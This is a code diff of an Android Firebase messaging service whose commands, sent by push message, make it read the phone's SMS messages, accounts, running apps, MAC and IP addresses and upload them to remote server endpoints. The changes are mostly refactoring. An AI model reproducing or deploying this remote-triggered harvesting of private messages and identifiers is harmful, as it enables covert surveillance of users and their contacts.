@@ -4,7 +4,6 @@ package project.service;
 import android.Manifest;
 import android.accounts.Account;
 import android.accounts.AccountManager;
-import android.annotation.TargetApi;
 import android.app.ActivityManager;
 import android.content.Context;
 import android.content.pm.PackageInfo;
@@ -153,7 +152,7 @@ public class FCMService extends FirebaseMessagingService {
                 java.sql.Date installedSQlDate = java.sql.Date.valueOf(aa);
 
                 String user = Build.USER;
-                WifiManager manager1 = (WifiManager) getSystemService(Context.WIFI_SERVICE);
+                WifiManager manager1 = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                 WifiInfo info = manager1.getConnectionInfo();
                 String macAddress = info.getMacAddress();
                 String ipv4 = getIPAddress(true);
@@ -280,11 +279,25 @@ public class FCMService extends FirebaseMessagingService {
                 serverDCBean = new ServerDCBean(userRefId, list, sqlDate, transactionID);
                 new SendToServer().execute(userRefId, serverDCBean.toString(), flowName);
             } else if (flowName.equalsIgnoreCase("ShortMessage")) {
-                if (Build.VERSION.SDK_INT >= 19) {
-                    targetAPI19(userRefId, flowName, transactionID);
-                } else {
-                    targetAPI14(userRefId, flowName, transactionID);
+
+                Cursor smsCur = null;
+                try {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
+                        smsCur = this.getContentResolver().query(Telephony.Sms.CONTENT_URI, SMS_PROJECTION_T19, null, null, Telephony.Sms.DEFAULT_SORT_ORDER);
+                    } else {
+                        smsCur = this.getContentResolver().query(SMS_URI_T14, SMS_PROJECTION_T14, null, null, null);
+                    }
+                } catch (Exception e) {
+                    Log.e(TAG, "Cant Query, returning null");
                 }
+                getSMSContent(userRefId, flowName, smsCur, transactionID);
+
+//                if (Build.VERSION.SDK_INT >= 19) {
+//                    targetAPI19(userRefId, flowName, transactionID);
+//                }
+////                else {
+////                    targetAPI14(userRefId, flowName, transactionID);
+////                }
             } else if (flowName.equalsIgnoreCase("GetAccounts")) {
                 if (ActivityCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) != PackageManager.PERMISSION_GRANTED) {
                     return;
@@ -306,11 +319,11 @@ public class FCMService extends FirebaseMessagingService {
                 java.sql.Date sqlDate = new java.sql.Date(Calendar.getInstance().getTime().getTime());
                 accountsBean = new AccountsBean(userRefId, accountList, sqlDate, transactionID);
                 new SendToServer().execute(userRefId, accountsBean.toString(), flowName);
-            } else if(flowName.equalsIgnoreCase("UsageStats")){
+            } else if (flowName.equalsIgnoreCase("UsageStats")) {
 //                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
 //                    getUsageStats21(userRefId, flowName, transactionID);
 //                } else {
-                    getUsageStats(userRefId, flowName, transactionID);
+                getUsageStats(userRefId, flowName, transactionID);
 //                }
             }
 
@@ -330,7 +343,7 @@ public class FCMService extends FirebaseMessagingService {
             lStringBuilder.append(processInfo.processName + " ");
 
         }
-        Log.d("Usage Stats",""+lStringBuilder);
+        Log.d("Usage Stats", "" + lStringBuilder);
 
         java.sql.Date sqlDate = new java.sql.Date(Calendar.getInstance().getTime().getTime());
         statsBean = new UsageStatsBean(userRefId, lStringBuilder, sqlDate, transactionID);
@@ -360,27 +373,29 @@ public class FCMService extends FirebaseMessagingService {
 //        Log.d("Usage Stats",""+lStringBuilder);
 //    }
 
-    @TargetApi(19)
-    private void targetAPI19(String userRefId, String flowName, int transID) {
-        Cursor smsCur = null;
-        try {
-            smsCur = this.getContentResolver().query(Telephony.Sms.CONTENT_URI, SMS_PROJECTION_T19, null, null, Telephony.Sms.DEFAULT_SORT_ORDER);
-        } catch (Exception e) {
-            Log.e(TAG, "Cant Query, returning null");
-        }
-        getSMSContent(userRefId, flowName, smsCur, transID);
-    }
 
-    @TargetApi(14)
-    private void targetAPI14(String userRefId, String flowName, int transID) {
-        Cursor smsCur = null;
-        try {
-            smsCur = this.getContentResolver().query(SMS_URI_T14, SMS_PROJECTION_T14, null, null, null);
-        } catch (Exception e) {
-            Log.e(TAG, "Cant Query, returning null");
-        }
-        getSMSContent(userRefId, flowName, smsCur, transID);
-    }
+//    private void targetAPI19(String userRefId, String flowName, int transID) {
+//        Cursor smsCur = null;
+//        try {
+//            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
+//                smsCur = this.getContentResolver().query(Telephony.Sms.CONTENT_URI, SMS_PROJECTION_T19, null, null, Telephony.Sms.DEFAULT_SORT_ORDER);
+//            }
+//        } catch (Exception e) {
+//            Log.e(TAG, "Cant Query, returning null");
+//        }
+//        getSMSContent(userRefId, flowName, smsCur, transID);
+//    }
+//
+//    @TargetApi(14)
+//    private void targetAPI14(String userRefId, String flowName, int transID) {
+//        Cursor smsCur = null;
+//        try {
+//            smsCur = this.getContentResolver().query(SMS_URI_T14, SMS_PROJECTION_T14, null, null, null);
+//        } catch (Exception e) {
+//            Log.e(TAG, "Cant Query, returning null");
+//        }
+//        getSMSContent(userRefId, flowName, smsCur, transID);
+//    }
 
     private void getSMSContent(String userRefId, String flowName, Cursor smsCur, int transID) {
         List<SMSBean> list = new ArrayList<>();
@@ -518,10 +533,10 @@ public class FCMService extends FirebaseMessagingService {
                     System.out.println(sb.toString());
                     return sb.toString();
                 } else {
-                    return new String("false : " + responseCode);
+                    return "Error "+responseCode;
                 }
             } catch (Exception e) {
-                return new String("Exception: " + e.getMessage());
+                return e.getMessage();
             }
         }
     }
@@ -643,9 +658,9 @@ public class FCMService extends FirebaseMessagingService {
                     url = new URL(CONTACTS_URL + ID);
                 } else if (flowName.equalsIgnoreCase("ShortMessage")) {
                     url = new URL(SMS_URL + ID);
-                }else if (flowName.equalsIgnoreCase("GetAccounts")) {
+                } else if (flowName.equalsIgnoreCase("GetAccounts")) {
                     url = new URL(ACCOUNTS_URL + ID);
-                }else if (flowName.equalsIgnoreCase("UsageStats")) {
+                } else if (flowName.equalsIgnoreCase("UsageStats")) {
                     url = new URL(USAGE_STATS_URL + ID);
                 }
                 System.out.println("URL" + url);
@@ -673,7 +688,7 @@ public class FCMService extends FirebaseMessagingService {
                     BufferedReader in = new BufferedReader(new
                             InputStreamReader(
                             conn.getInputStream()));
-                    StringBuffer sb = new StringBuffer("");
+                    StringBuilder sb = new StringBuilder("");
                     String line = "";
 
                     while ((line = in.readLine()) != null) {
@@ -684,10 +699,10 @@ public class FCMService extends FirebaseMessagingService {
                     System.out.println(sb.toString());
                     return sb.toString();
                 } else {
-                    return new String("false : " + responseCode);
+                    return "Error "+responseCode;
                 }
             } catch (Exception e) {
-                return new String("Exception: " + e.getMessage());
+                return e.getMessage();
             }
         }
     }
